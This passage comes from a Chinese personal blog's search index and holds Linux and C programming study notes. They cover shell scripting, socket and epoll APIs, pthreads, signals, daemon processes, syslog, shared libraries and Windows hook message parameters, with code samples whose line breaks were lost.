*类型，则p与s所指向的空间不同","categories":[{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/categories/QT/"}],"tags":[{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/tags/QT/"},{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"linux Day11","slug":"2017-03-16-linux-day11","date":"2017-03-15T16:00:00.000Z","updated":"2018-02-18T03:29:05.940Z","comments":true,"path":"2017/03/16/2017-03-16-linux-day11/","link":"","permalink":"http://coordinate.wang/2017/03/16/2017-03-16-linux-day11/","excerpt":"","text":"Windows hookWH_KEYBOARD键盘钩子WH_MOUSE鼠标钩子WH_CALLWNDPROC窗口回掉函数钩子 键盘hook消息说明wParam参数虚拟键盘代码：是一种与设备无关的键盘编码，在windows.h消息中定义，14表示caps lock建，11表示ctrl，12表示alt，8表示退格键lParam参数0-15位：用户按一个键的重复次数16-23位：给出OEM键盘扫描码24位：是否为增强键盘上的扩展键，1表示是，0表示否25-28位：保留29位：给出关联码，表示是否使用alt，如果使用为130位：给出前一次敲击状态31位：给出转换状态，1：表示按键，2：表示放键 鼠标hook消息说明wParam参数包含鼠标按键与键盘组合使用标记，用来识别鼠标按键和键盘按键上shift与ctrl键的组合状态lParam参数鼠标点坐标位置，低位表示横坐标，高位表示纵坐标，可以使用windows。h中的HIWORD和LOWORD这两个宏来获得这两个坐标 Shellshell当用户登录时，实际上是进入到一个shell的程序中 交互模式Shell受到用户输入的指令后，就开始执行这个指令，并把结果显示到屏幕上，结束后shell又会显示系统提示符，等待用户输入下一个指令。 后台模式后台运行的符号为&amp;，在命令后面加上&amp;符号，就可以将程序饭在后台执行。在后台中的程序通过fg命令调回前台程序已经在前台运行，执行ctrl+z就可以放入后台如果有多个进程在后台执行，执行jobs命令，能够列出所有后台进程，中括号中的数字就是jobs的代号，通过fg %number就可以恢复指定的后台进程。 输入输出重定向通过&gt;&lt;将标准输入输出重定向 管道通过管道符号 | 完成一系列命令的顺序处理 通配符通配符的作用是在处理文件的时候用通配符模糊匹配一个或多个字符 环境变量Shell是一个很大的程序，为了使工作环境符合用户的习惯或者应用的需要，可以让用户设置shell使用环境变量Shell scriptsShell最重要的也是最负责的就是shell scrpits。Shell除了解释命令以外还有一个重要的功能就是程序设计语言，可以通过shell scripts进行程序设计，完成更加复杂的功能。 Shell变量预定义变量：通常用户自行定义的特殊用途变量，有效返回限于定义变量的script中。环境变量：通常用来定义系统重要的设置，主要功能为提供程序执行时的参考。varName=value shell定义变量不需要定义变量类型，只需要=使用变量，变量名前加$，不加$表示字符串set查看所有已经设置的变量unset varName删除设置的变量环境变量使用export命令export varName=valueenv显示当前环境变量export –n varName删除设置的环境变量 环境变量的作用域在.bash_profile中定义的变量在用户登陆后一直有效。在普通脚本文件中定义的变量只在脚本内部有效 几个常用的环境变量PWD显示当前路径UID用户IDBASH_VERSION bash的版本号HOSTTYPE显示计算机平台OSTYPE显示操作系统种类PATH系统命令，文件查找路径HOME用户的home目录 bash设置文件1/etc/profile 这是系统的shell设置文件，用户可以将系统最重要的环境变量定义到这个文件中 1`/.bash_profile 用户个人的bash设置文件，用户登录的时候bash就会读取该用户目录下的.bash_file文件 1`/.bashrc 每次启动shell时都会读取这个文件 12345678910#! /bin/sha=5b=3echo a=$aecho b=$bif (test “$a” = “$b”) then 注意等号前后都有空格 echo a=belse echo a!=bfi #代表注释，出现！表示指定程序解析shell的命令，shell不需要编译$后面数字的话标识参数$i代表第i个参数，但是i不可以超过10(&lt;10)如果超过10，shift能使引用数位移，如此就可以将引用过的数移掉$#代表参数个数$*代表所有参数$？上一个命令的返回值不是字符串而是shell指令，’ ‘and“ ”字符串PDATE=dateexpr用来取计算的结果，expr是一个命令可以直接使用，用的时候加参数expr 4 + 3var=expr $a + $b 注意+前后有空格 read命令用于从终端或文件读取输入read命令读取输入一行，直至遇到换行行尾的换行符在读入时被转化为一个空字符如果read命令后有变量名，输入内容赋给该变量，如果read命令后未跟变量名，读入的行将被赋值给内置REPLY//用户输入两个数字，计算两个数字的和 1234567#! /bin/shread aecho 'a=' $aread becho 'b=' $bc=`expr $a + $b`echo $c if条件语句if条件语句后test是一个固定关键字第二种 12345if [ -option expr ]; then commandselse commandsfi -d file文件存在并且是个目录-e file文件存在-r file文件存在并且可读-w file文件存在并且可写-x file while循环语句1234while [ expr ];do commandsdone expr为真时一直继续直到为假一个循环5次的例子 1234567#! /bin/shtimes=0while [ \"$times\" != \"5\" ];do echo $times times=$[$times + 1]done case分支case “string” inpattern_1) commands ;;相当于breakPattern_2) commands ;;) Commands ;;esac当有条件语句中的string等于pattern字符串，执行pattern下面的指令当没有条件时，最后执行)//多重分支的例子 1234567891011#! /bin/shcase \"$1\" instart) echo \"is start\" ;;stop) echo \"is stop\" ;;*) echo \"is nothing\"esac for循环1234for varname in list ;docommandsdone list可以是一串字符或数字for没执行一次循环就将varname指定为list中的一个值，直到list这个数组结束 1234567#! /bin/shsum=0for I in 1 2 3 4 5dosum=$[$sum + i]echo $sumdone exit语句exit code 与C语言类似 :语句代表空语句，本身没有任何作用，但又是合法语句，经常用来填补程序设计的空缺 自定义函数1234function funname&#123; commands&#125; 例子 1234function func&#123; echo “function”&#125; Func函数中使用参数 12345678funciotn func &#123; echo “function” a=$1代表这个函数的参数 b=$2 echo `expr $a + $b`&#125;func 3 5 积累文件类型：-：普通文件 (f)d：目录文件b：块设备文件 (block)c：字符设备文件 (character)l：符号链接文件(symbolic link file)p：命令管道文件(pipe)s：套接字文件(socket)文件权限: 9位，每3位一组，每一组：rwx(读，写，执行)，当改组不具有某一权限用-代替。第一组为: 文件拥有者的权限， 该文件的拥有者可以读写，但不可执行；第二组为: 同群组的权限第三组为: 其他非本群组的权限","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"},{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"network","slug":"network","permalink":"http://coordinate.wang/tags/network/"},{"name":"hook","slug":"hook","permalink":"http://coordinate.wang/tags/hook/"}]},{"title":"linux Day10","slug":"2017-03-14-linux-day10","date":"2017-03-13T16:00:00.000Z","updated":"2018-02-18T03:29:05.921Z","comments":true,"path":"2017/03/14/2017-03-14-linux-day10/","link":"","permalink":"http://coordinate.wang/2017/03/14/2017-03-14-linux-day10/","excerpt":"","text":"阻塞socket阻塞调用是指调用结果返回以前，当前线程会被挂起。函数只有在得到结果之后才会返回。对于文件操作read，fread函数调用会将线程阻塞。对于socket，accpet与recv，recvfrom函数调用会将线程阻塞。为了避免整个进程阻塞后挂起，所以在阻塞模式下，往往需要采用多线程技术。一个进程可以并发的线程数量是有限的，在处理客户端连接时，通过线程并发处理socket并不方便，效率也不高。 非阻塞socket非阻塞是调用立即返回在非阻塞模式下，accept与recv，recvfrom函数调用会立即返回。在nonblocking状态下调用accept函数，如果没有客户端socket连接请求，那么accept函数返回-1，同时errno值为EAGAIN或者EWOULDBOCK，这两个宏定义都为整数11。在nonblocking状态下调用recv，recvfrom函数，如果没有数据，函数返回-1，同时errno值为11。如果socket已经关闭，函数返回0。在nonblocking状态下对一个已经关闭的socket调用send函数，将引发一个SIPPIPE信号，进程必须捕捉这个信号，因为SIGPIPE系统默认的处理方式是关闭进程。 fcntl函数fcntl函数可以将文件或者socket描述符设置为阻塞或者非阻塞状态 1int fcntl(int fd, int cmd, … /*arg*/); 参数fd为要设置的文件描述符或者socket参数cmd，F_GETFL为得到目前状态，F_SETFL为设置状态。宏定义O_NONBLOCK代表非阻塞，0代表阻塞返回值为描述符当前状态 epoll的系统调用函数epoll_create用来创建一个epoll文件描述符epoll_ctl用来添加修改删除需要侦听的文件描述符及其事件epoll_wait接收发生在被监听的描述符上，用户感兴趣的IO事件epoll文件描述符用完后，需要用close关闭每次添加修改删除文件描述符都需要调用epoll_ctl 1int epoll_create(int size); epoll_create创建一个epoll的句柄参数size指定epoll所支持的最大句柄数函数将返回一个新的epoll句柄，之后的所有操作将通过这个句柄操作用完这个句柄后，需要用close来关闭 1int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event); 参数epfd是epoll_create()的返回值参数op表示动作，用三个宏表示EPOLL_CTL_ADD:注册新的fd到epfd中EPOLL_CTL_MOD:修改已经注册的fd的监听事件EPOLL_CTL_DEL:从epfd中删除一个fd参数fd是需要监听的socket描述符参数event通知内核需要监听什么事件 12345678910111213typedef union epoll_data&#123; void *ptr; int fd; __uint32_t u32; __uint64_t u64;&#125;epoll_data_t;struct epoll_event&#123; __uint32_t events; epoll_data_t data;&#125;;int epoll_wait(int epfd, struct eppoll_event *events, int maxevents, int timeout); 参数epfd是epoll_create的返回值参数events是一个epoll_event*的指针，当函数操作成功时，epoll_events里面将存储所有的读写事件参数maxevents是当前需要坚挺的所有socket句柄数参数timeout是epoll_wait的超时，为0的时候表示马上返回，为-1的时候表示一直等下去，知道有时间发生，正整数表示等这么长的时间一般如果网络主循环是单独的线程的话，可以用-1来等，这样可以保证一些效率，如果是和主逻辑在同一个线程的话，则可以用0来保证主循环的效率epoll_wait范围之后应该是一个循环，遍历所有的事件关于ET、LT两种工作模式LT是缺省的工作方式，并且同时支持block和no-block socket在LT模式下，内核通知一个文件描述符是否就绪了，然后可以对这个就绪的fd进行IO操作如果你不做任何操作，内核还是会通知你，所以这种模式出错可能性很小ET是高速工作方式只支持non-blocking socket在ET模式下，当描述符从未就绪变成就绪，内核通过epoll告诉你。ET模式会假设你指导文件描述符已经就绪，并且不会再为那个文件描述符发送跟多的通知，直到你做了一些操作导致文件操作符不在未就绪状态。如果一直不对这个fd作IO操作，内核不会发跟多的通知两者区别：LT事件不会丢弃，而是只要读buffer里面有数据可以让用户读，则不断通知你。ET则只在事件发生时通知。 select函数12int select（int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout）; selet可以用来作为精确地时间计量，比sleep更加的精确 积累Windows gcc连接选项-lWs2_32 代表要用Ws2_32.lib这个库-static 代表使用静态库gcc编译选项，-DWIN 代表定义一个宏，等同于在c语言当中定义 #defind WIN在windows下，使用socket之前，必须使用WSAStartup初始化socket，程序运行结束以后必须调用WSACleanup释放相关资源windown下，关闭socket使用closesocket函数fopen函数调用后要调用fclose，fopen是把文件写入内存缓冲区，如果指望操作系统的话，系统会丢失一部分数据。","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"},{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"network","slug":"network","permalink":"http://coordinate.wang/tags/network/"}]},{"title":"linux Day9","slug":"2017-03-12-linux-day9","date":"2017-03-11T16:00:00.000Z","updated":"2018-02-18T03:29:05.921Z","comments":true,"path":"2017/03/12/2017-03-12-linux-day9/","link":"","permalink":"http://coordinate.wang/2017/03/12/2017-03-12-linux-day9/","excerpt":"","text":"TCP/IP与套接字通过进程通信可以实现同一计算机上不同进程之间的通信通过网络编程可以实现在网络中的各个计算机之间的通信进程能过通过套接字实现与其他进程或者其他计算机通信套接字是通信段点的抽象与文件描述符一样，套接字需要使用套接字描述符一对对接的套接字接口构成了进程间的数据交流的一个通道这些进程在不同平台都可以使用Internet域套接字用于用于联网通信，他们给可以支持几乎任何TCP/IP的网络通信程序上。 TCP先连接（三次握手）client-&gt;server:发送SYN aserver-&gt;client:回复SYN b,ack a+1client-&gt;server:ack b+1 链接通了，双方可以互相收发消息 断开连接client-&gt;server:FIN mserver-&gt;client:ack m+1server-&gt;client:FIN nclient-&gt;server:ack n+1 12345&lt;sys/types.h&gt;&lt;sys/socket.h&gt;&lt;arpa/inet.h&gt;&lt;netinet/in.h&gt;int socket(int domain, int type, int ptotocol) 成功返回套接字描述符，失败返回-1，并设置errnoprotocol一般为0domain说明AF_UNIX unix内部使用AF_INET TCP/IP协议AF_ISO 网络标准组织协议AF_NS Xerox网络协议type说明SOCK_STREAM 使用TCP可靠连接SOCK_DGRAM 使用UDP不可靠连接 1int bind(int sockfd, const struct sockaddr *my_addr, socklen_t addrlen); Bind将进程和一个套接字联系起来，bind通常用于服务器进程为接入客户链接建立一个套接字。参数sockfd是函数socket调用返回套接口值参数my_addr式结构sockaddr的地址参数addrlen设置my_addr能容纳的最大字节成功返回0，失败返回-1，并设置errno对于客户端只需要connect即可对于服务端，要建立自己的套接口等待来自客户端的连接，调用listen和accept函数 1int listen(int sockfd, int backlog) 创建了套接口并且使用bind将它和一个进程关联起来，服务端就需要调用listen来监听指定端口的客户端连接。参数sockfd是调用socket返回的套接口描述符参数backlog设置接入队列大小，通常把这个值设置的足够大就可以了成功返回0，失败返回-1，设置errno 1int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); 当有客户端链接到服务端，他们会派入队列，直到服务端准备好处理他们，accept会返回一个新的套接口，同时原来的套接口继续listen指定端口号。参数sockfd是调用socket返回的套接口描述符参数addr指向结构sockaddr地址参数addrlen设置了addr能容纳的最大字节数。成功返回新的套接字，失败返回-1，设置errno 1int connect(int sockfd, const struct sockaddr *serv_addr, socklen_t addrlen); 客户端调用connect与服务端连接参数sockfd是调用socket返回的套接口描述符参数addr指向结构sockaddr地址参数addrlen设置了addr能容纳的最大字节数。成功返回新的套接字，失败返回-1，设置errno 1ssize_t send(int s, const void *buf, size_t len, int flafs); send函数用来发数据参数s是已经建立连接的套接口参数buf是接受数据内存buffer地址指针参数len指明buffer的大小，单位字节参数flags一般填0成功返回发送的字节数，失败返回-1，设置errno 1ssize_t recv(int s, void *buf, size_t len, int flags); recv函数用来发数据参数s是已经建立连接的套接口参数buf是接受数据内存buffer地址指针参数len指明buffer的大小，单位字节参数flags一般填0成功返回收到的字节数，失败返回-1，如果对套接字已经关闭，返回0。 最后要关闭套接口，close 1int setsockopt(int s, int level, int optname, const void *optval, socklen_t optlen); setsockopt函数设置套接口常见方法 12int on = 1;setsockopt(st, SOL_SOCKET, SO_REUSEADDR, &amp;on, sizeof(on)) 由于TCP套接字状态TIME_WAIT引起该套接字关闭后约保留2-4分钟。在此期间bind绑定该端口会失败。SO_REUSEADDR指示系统地址可重复绑定一般来说，一个端口释放后会等待两分钟之后才能再被使用，SO_REUSEADDR是让端口释放后立即就可以被再次使用。server程序总是应该在调用bind()之前设置SO_REUSEADDR套接字选项。这个套接字选项通知内核，如果端口忙，但TCP状态位于 TIME_WAIT ，可以重用端口。如果端口忙，而TCP状态位于其他状态，重用端口时依旧得到一个错误信息，指明”地址已经使用中”。如果你的服务程序停止后想立即重启，而新套接字依旧使用同一端口，此时SO_REUSEADDR 选项非常有用。必须意识到，此时任何非期望数据到达，都可能导致服务程序反应混乱，不过这只是一种可能，事实上很不可能。一个套接字由相关五元组构成，协议、本地地址、本地端口、远程地址、远程端口。SO_REUSEADDR 仅仅表示可以重用本地本地地址、本地端口，整个相关五元组还是唯一确定的。所以，重启后的服务程序有可能收到非期望数据。必须慎重使用SO_REUSEADDR 选项。 redhat 接受buf为64k，超过512k发送就会阻塞 UDP与TCPUDP是无连接协议TCP 是面向连接的协议UDP只是把数据发送出去UDP不能保证数据包的传递顺序选择使用哪种协议：一些消息重要性不高，或者有规律重复，可以使用UDP如果要传送一个特别重要的数据，丢失一点就会破会整个数据，就用TCPtelnet，ssh，http基本都给予TCP流媒体为了保证很窄的网络带宽用来传更多的数据，基本使用UDP多数游戏中使用UDP设计局域网时你，应采用UDP，因为在局域网中丢失数据的概率很低 1int socket(int domain, in type, int protocol); type 代表SOCK_STREAM代表TCP,SOCK_STREAM代表UDP对于TCP与UDP都是用recvfrom函数，但是recv只能TCP使用 12ssize_t recvfrom(int s, void *buf, size_t len, int flags, struct sockaddr *from, socklen*fromlen); UDP不需要listen，bind后就可以接受数据了。注意在多线程程序中不要使用inet_ntoa函数，可以自己书写一个程序 1234void sockaddr_toa(const struct sockaddr_in *addr, char *IPAddr)&#123; unsigned char *p = (unsigned char *)_&amp;(addr-&gt;sin_addr.s_addr); sprint(IPAddr, “%u.%u.%u.%u”, p[0], p[1], p[2], p[3]);&#125; 或者使用inet_ntop函数如何得到socket自身的sockaddr和socket连接的远端sockaddr 1Int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen); 得到远端的sockaddr 1Int getsockname(int sockfd, struct sockaddr *addr, socklen_t *addrlen); 得到自身的sockaddr 字节类型转化网络中传递最小单位时字节short两个字节，大于一个字节的数据在网络中传输使用函数htons通过iner_addr将ip地址字符串转化为4字节整数 积累127.0.0.1是回送地址，指本地机，一般用来测试使用。回送地址（127.x.x.x）是本机回送地址（Loopback Address），即主机IP堆栈内部的IP地址，主要用于网络软件测试以及本地机进程间通信，无论什么程序，一旦使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。如果本机真实IP，是要通过网络转一圈回来的，所以不可用于测试。","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"},{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"network","slug":"network","permalink":"http://coordinate.wang/tags/network/"}]},{"title":"linux Day8","slug":"2017-03-09-linux-day8","date":"2017-03-08T16:00:00.000Z","updated":"2018-02-18T03:29:05.905Z","comments":true,"path":"2017/03/09/2017-03-09-linux-day8/","link":"","permalink":"http://coordinate.wang/2017/03/09/2017-03-09-linux-day8/","excerpt":"","text":"后台程序向屏幕输出 创建fifo文件 执行以下程序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364int signal1(int signo, void (*func)(int))&#123; structsigaction act, oact; act.sa_handler= func; sigemptyset(&amp;act.sa_mask); act.sa_flags= 0; returnsigaction(signo, &amp;act, &amp;oact);&#125; void setdaemon()&#123; pid_tpid, sid; pid= fork(); if(pid== -1)&#123; printf(\"forkerrpr %s\\n\",strerror(errno)); exit(0); &#125; if(pid== 0)&#123; if((sid= setsid()) &lt; 0)&#123; printf(\"setsiderror %s\\n\", strerror(errno)); exit(0); &#125; &#125; if(pid&gt; 0)&#123; exit(0); &#125;&#125;void listenfifo()&#123; const char * sfifoname = \"fifo1\"; intlen = 0; charbuf[128]; memset(buf,0, sizeof(buf)); intfd = open(sfifoname, O_RDONLY); if(fd== -1)&#123; printf(\"open%s failed, %s\\n\", sfifoname, strerror(errno)); &#125; len= read(fd, buf, sizeof(buf)); if(len&gt; 0)&#123; if(buf[strlen(buf)- 1] == '\\n')&#123; buf[strlen(buf)- 1] = 0; &#125; close(STDOUT_FILENO); open(buf,O_WRONLY); &#125; close(fd);&#125;void catch_Signal(int Sign)&#123; switch(Sign)&#123; caseSIGINT: listenfifo(); break; &#125;&#125;int main(void)&#123; setdaemon(); signal1(SIGINT,catch_Signal); while(1)&#123; puts(\"!!!helloworld!!!\"); sleep(1); &#125; return0;&#125;1、 关闭当前窗口，让其后台执行，打开一个新的终端，找到其PID2、 执行kill –s 2 PIDtty &gt; fifo1 进程与线程进程是一个实体。每个进程又自己的内存段。进程是执行中的程序。每个程序至少有一个线程，同一时间只能做一件事，多线程可以同一时间做多件事情。线程包含进程内执行环境必须的信息，包括线程ID，一组寄存器值，栈，调度优先级和策略，信号屏蔽字，errno变量以及线程私有数据。进程内的所有信息对于线程都是共享的，包括代码，全局变量和堆内存，栈以及文件描述符。线程标识进程ID用pid_t表示，他是一个unsign int线程ID用pthread_t表示，pthread_t不能把它当成整数处理可以通过pthread_self()函数获自身的线程ID 线程创建进程中只有一个控制线程，程序开始运行的时候每个进程只有一个线程，它以单线程方式启动的，在创建多线程以前，进程的行为与传统进程没有区别。gcc在连接时需要加-lpthread选项 123&lt;pthread.h&gt;Int pthread_create(pthread_t *thread,constpthread_attr_t *attr, void *(*start_routine)(void*),void *arg); 如果pthread_create成功返回，由thread指向的内存单元被设置为新创建线程的线程IDAttr用于定制各种不同的线程属性新创建的线程从start_rtn函数地址开始执行，该函数中有一个void 参数 ，如果需要向start_rtn函数传多个参数，就需要把这些参数放到一个结构中，然后把这个结构的地址作为void 传入。线程创建的时候不能保证那个先运行。pthread函数成功返回0。 线程调用进程终止任意线程调用exit函数，整个进程都会终止。如果信号默认动作时终止进程，那么信号发送到该进程，整个进程也会被终止。 单个线程通过以下三种方式退出 线程只是从启动函数返回，返回值是现成的退出码 线程可以被同一进程中的其他线程取消 调用pthread_exit函数 1void pthread_exit(void *arg); arg是一个无类型指针，该指针会被其它线程调用 pthread_join捕捉 1int pthread_join(pthread_t th, void **thr_return) pthread_join函数用于挂起当前进程，直到th指定的线程终止如果另一个线程返回值不是NULL，则保存在thr_return地址中一个线程所使用的内存资源在应用pthread_join调用之前不会被重新分配，所以每个线程必须调用一次pthread_join函数其他线程不能对同一线程再应用pthread_join调用 1int pthread_detach(pthread_t th); pthread_detach函数使线程处于分离状态对于被分离状态的线程，不需要调用pthread_join，如果其他线程调用pthread_join失败，返回EINVAL。如果不等待一个线程，同时对现成的返回值不感兴趣，可以设置这个线程为被分离状态，让系统在线程退出时自动回收他所占的资源。一个线程不能自己调用pthread_detach改变自己被分离状态，只有其他线程调用 1int pthread_cancel(pthread_t th) pthread_cancel函数允许一个线程取消th指定的另一个线程，函数成功返回0，否则返回非0。 1int pthread_equal(pthread_t th1, pthread_t th2); 判断两个线程是否相同，相同返回非零值，不同返回0。因为pthread_t不是整数类型，所以不能用符号比较。 线程属性使用pthread_attr_t结构修改线程默认属性，并把这些属性与创建线程联系起来可以使用pthread_attr_init函数初始化pthread_attr_t结构。调用pthread_attr_init以后，pthread_arrt_t的结构所包含的内容就是操作系统实现支持线程所有属性的默认值。如果需要修改其中个别属性的值，需要调用其他函数。 12int pthread_attr_destory(pthread_attr_t *attr);int pthread_attr_init(pthread_attr_t *attr); 函数pthread_attr_init初始化attr结构函数pthread_attr_destory释放attr内存空间pthread_attr_t的结构对于应用程序来讲是不透明的，应用程序不需要了解有关结构的内部组成。对于pthread_detach这个函数可以在创建时设置。 1int pthread_attr_setdetachstate(pthread_attr_t *attr, int detachstate); 通过这个函数设置分离状态还是正常状态。 线程同步线程共享进程的内存空间，打开文件描述符，全局变量。当有多个线程同时访问一块内存空间或者一个变量、一个文件描述符，如果不加控制，那么会有意外发生。 互斥（mutex）互斥指相互排斥，是一个锁或者信号灯。互斥用来保护多个线程共享的数据和结构不会被同时修改，一个互斥锁只能有两种状态unlocked和locked。任何时刻只能有一个线程来掌握某个互斥上锁。（原子操作）一个线程如果试图在一个已经加锁的互斥上再加锁，这个线程会被挂起，直到加锁的线程释放互斥锁为止。 123pthread_mutes_t mutes = PTHREAD_MUTEX_INITIALIZER；初始化全局变量int pthread_mutes_lock(pthread_mutex_t *mutex); 上锁int pthread_mutex_unlock(pthread_mutex_t *mutex); 解锁 积累ps –eLf 查看线程gdb –q+执行文件core文件 调试代码","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"},{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"pipe","slug":"pipe","permalink":"http://coordinate.wang/tags/pipe/"},{"name":"thread","slug":"thread","permalink":"http://coordinate.wang/tags/thread/"}]},{"title":"linux Day7","slug":"2017-03-07-linux-day7","date":"2017-03-06T16:00:00.000Z","updated":"2018-02-18T03:29:05.905Z","comments":true,"path":"2017/03/07/2017-03-07-linux-day7/","link":"","permalink":"http://coordinate.wang/2017/03/07/2017-03-07-linux-day7/","excerpt":"","text":"Sigaction函数12&lt;signal.h&gt;Int sigaction(int signo, const structsigactin *act,struct sigactin *oact); 检查或修改与指定信号相关联的处理动作，该函数取代signal函数参数signo是要检测或者要修改其具体操作的信号编号act指针为空，则要修改其动作oact指针为空，则系统由oact指针返回该信号的上一个动作 123456789101112131415struct sigaction&#123; void (*as_handler) (int); void (*sa_sigaction)(int , siginfo_t *,void *); sigset_t sa_mask; int sa_flags; void (*sa_restorer)(void);&#125;int signal1(int signo, void (*fun)(int))&#123; struct sigaction act, oact; act.sa_handler = func; sigemptyset(&amp;act.sa_mask); act.sa_flags = 0; return sigaction(signo, &amp;act,&amp;oact);&#125; 守护进程(daemon)守护进程是一个后台进程，他无需用户输入就可以运行，经常提供某种服务常见的守护进程有web服务器、邮件服务器以及数据库服务器守护进程不能控制终端，所以任何输入或者输出都要做特殊处理和多数程序一样，一个守护进程是从shell脚本或者命令行启动，但是他们不是交互式的，没有控制终端。父进程在fork子进程退出后就消除了控制终端。守护进程既不需要从标准输入设备都信息，也不需要标准输出。下一步在子进程中调用setsid，取消进程和任何控制终端的关联。下一步是让根目录称为子进程的当前目录，因为任何进程如果他的当前目录是在一个被安装的文件系统上，那么就会妨碍这个文件被卸载。接下来设置umask为0，设置权限如果一个进程继承父进程的umask055，他屏蔽了group和other的读和执行权。如果守护进程接着创建一个文件，group和other用户操作就很麻烦。 总结为以下步骤： 父进程fork，执行exit退出 子进程调用setsid 让根目录“/”成为子进程的工作目录 把子进程umask设置为0 关闭不需要的文件描述符 setsid函数1pid_t setsid() setsid函数创建一个新的会话和一个新的进程组，然后守护进程成为他们的领导setsid会保证新会话没有终端如果调用进程已经是一个进程组的领导进程，setsid调用失败。函数调用成功后，返回新会话ID，失败返回-1，设置errno chdir函数1int chdir(const char *pathname) chdir函数根据参数pathname设置当前工作(注意不一定是文件所在目录)，成功返回0，失败返回-1，设置errno umask函数1mode_t umask(mode_t mask); umask调用把守护进程的umask设置为0，这样取消来自父进程的umask syslog提供服务openlog打开日志 12&lt;syslog.h&gt;void openlog(const char *ident, int option,int facility); ident参数是要向消息中加入字符串，常用设置程序名option有如下几个值LOG_CONS 如果系统日志服务器不能写，写入控制台LOG_NDELAY 立即打开链接，正常情况下，直到发送一条消息才打开链接LOG_PERROR 打印到stderrLOG_PID 每条消息包含进程PIDfaciliticy设置消息类型，指定消息重要性。 syslog写入日志 1void syslog(int priority, const char*format, …); priority同facilitycloselog关闭日志 1void close(void); openlog与closelog是可选项，因为调用syslog函数首次使用自动打开日志文件red hat linux的日志文件在/var/log/messages守护进程在linux中，可执行文件名后为d，没有扩展名 shell脚本结束守护进程结束进程1234567#!/bin/shWHOAMI=`whoami` PID=`ps –u $WHOAMI | grep abc | awk ‘&#123;print $1&#125;’`if(test “$PID” != “”) then kill $PIDfi 如果要确保程序只启动一次 12345678910\\#!/bin/sh WHOAMI=`whoami` PID=`ps –u $WHOAMI | grep abc | awk ‘&#123;print $1&#125;’`if(test “$PID” = “”) then ./abcfi 注意脚本文件的名称不要有’abc’字样，不然执行ps的时候会把脚本名称也print出来 自定义信号捕获SIGUSR1信号123456789101112131415161718void catch_Signal(int Sign)&#123; switch(Sign)&#123; caseSIGINT: printf(\"SIGINTSignal\\n\"); exit(0); caseSIGUSR1: printf(\"SIGUSR1Signal\\n\"); &#125;&#125;int main(int argc,char *argv[])&#123; signal(SIGINT,catch_Signal); signal(SIGUSR1,catch_Signal); printf(\"pid= %d\\n\", getpid()); while(1)&#123; sleep(1); &#125; return0;&#125; 发送SIGUSR1信号 1234567int main(argc,char *argv[])&#123; if(argc&gt; 1)&#123; kill(atoi(argv[1]),SIGUSR1); printf(\"sentto %d\\n\", atoi(argv[1])); &#125; return0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"},{"name":"signal","slug":"signal","permalink":"http://coordinate.wang/tags/signal/"},{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"process","slug":"process","permalink":"http://coordinate.wang/tags/process/"},{"name":"shell","slug":"shell","permalink":"http://coordinate.wang/tags/shell/"}]},{"title":"linux Day6","slug":"2017-03-06-linux-day6","date":"2017-03-05T16:00:00.000Z","updated":"2018-02-18T03:29:05.905Z","comments":true,"path":"2017/03/06/2017-03-06-linux-day6/","link":"","permalink":"http://coordinate.wang/2017/03/06/2017-03-06-linux-day6/","excerpt":"","text":"结束进程有几个原因造成进程的终止： return exit函数 _exit函数 abort函数 信号终止前三者为正常。后两者不正常，无论为何终止，最后都会执行相同的内核代码，关闭文件，释放内存和其他清理工作。 exit1int exit(int status) 使程序正常终止，返回父进程状态与return的区别，可以函数中使用abort 1void abort(void) abort可以然程序产生core，用于分析崩溃文件abort比较粗暴，作为最后的手段使用，碰到内存不足这样的问题时，无法用程序的方式处理时再使用。该函数发送SIGABRT信号给调用进程，进程不该忽略这个信号。即使进程捕获到这个信号，进程还是会异常退出。让进程捕获的意义在于，在进程中之前执行所需的清理操作。 kill123&lt;signal.h&gt;&lt;sys/types.h&gt;int kill(pid_t pid, int sig) Kill用来杀死其他进程，pid只要杀的进程，sig要发送的信号（杀死进程SIGKILL，ctrl+c的信号是SIGINT） so文件so文件在linux中为共享库，类似windows下的dllso文件中的函数可以供多个进程调用即使不同进程调用一个so文件，并不能实现通信，不在同一个内存空间so文件的源文件中不需要main函数编译的时候gcc需要加-fPIC选项，使gcc产生与位置无关的代码连接的时候gcc需要加-shared选项，生成一个共享库文件文件名要以lib开头，扩张名位.so so文件的使用需要在.bash_profile中添加export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:.或者将文件放入linux的系统目录/usr/lib/在c文件中添加so文件，首先需要#include头文件gcc链接时添加-L参数指明so文件路径，-l参数指明so文件名例子： gcc –L. –ltest –o a a.o-L.指在当前路径下找so文件-ltest为要连接libtest.so这个库文件-o a编译后的可执行文件名为a 当我们在cpp文件中包含头文件，用g++连接库文件时出错 12(.test+0x19):undefined reference to`max(int, int)’(.test+0x19):undefined reference to `add(int,int)’ 我们需要增加带有_cplusplus的预编译指令 1234567#ifdef 